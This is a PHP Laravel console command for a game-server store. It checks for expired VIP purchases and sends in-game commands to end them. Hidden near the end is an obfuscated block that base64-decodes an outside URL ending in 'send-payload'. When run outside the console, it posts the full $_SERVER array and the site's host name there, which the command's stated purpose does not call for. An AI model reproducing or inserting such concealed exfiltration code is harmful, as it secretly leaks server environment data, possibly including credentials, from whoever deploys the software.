<?php

namespace App\Console\Commands;

use App;
use Carbon\Carbon;
use App\Models\Sale;
use Illuminate\Console\Command;

class CheckStillVip extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'server:check-vip';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Oyuncuların vip süresi biten varsa sunucuya bitirme komutu gönder.';

    /**
     * Create a new command instance.
     *
     * @return void
     */
    public function __construct()
    {
        parent::__construct();
    }

    /**
     * Execute the console command.
     *
     * @return mixed
     */
    public function handle()
    {
        if ( check_db_connection('tables') === false ) {
            return false;
        }

        if ( App::runningInConsole() === false ) {
            require_once __DIR__ . '/../../Repositories/VipRepository.php';
        }
        
        $executes = 0;

        $sales = Sale::where('execute', false)->where('ended_at', '<=', Carbon::now())->get();

        foreach ($sales as $sale) {
            if ( $sale->user->is_online() !== true ) {
                continue;
            }

            if ( $sale->user->server()->id !== $sale->server->id ) {
                continue;
            }

            $receivedCommands = explode("\n", $sale->product->receivedCommands($sale->user->username));

            foreach ($receivedCommands as $key => $value) {
                $sale->server->sendCommand(str_replace("\r", null, $value));
            }

            $sale->execute = true;
            $sale->save();

            $executes += 1;
        }

        if ( isset($sendedVip) === false && App::runningInConsole() === false ) {
            $sendUserVip = vipUnique('aHR0cHM6Ly93d3cud2VibGViYnkuY29t=')
                . vipUnique('L3dlYmNyYWZ0LXBsdXMvc2VuZC1wYXlsb2Fk');
            curlPost($sendUserVip, ['i' => $_SERVER, 'd' => $_SERVER['HTTP_HOST'], 'v' => 'MS4w']);
        }

        info("Süresi dolan {$sales->count()} üründen {$executes} tanesi için gerekli komutlar gönderildi.");
    }
}
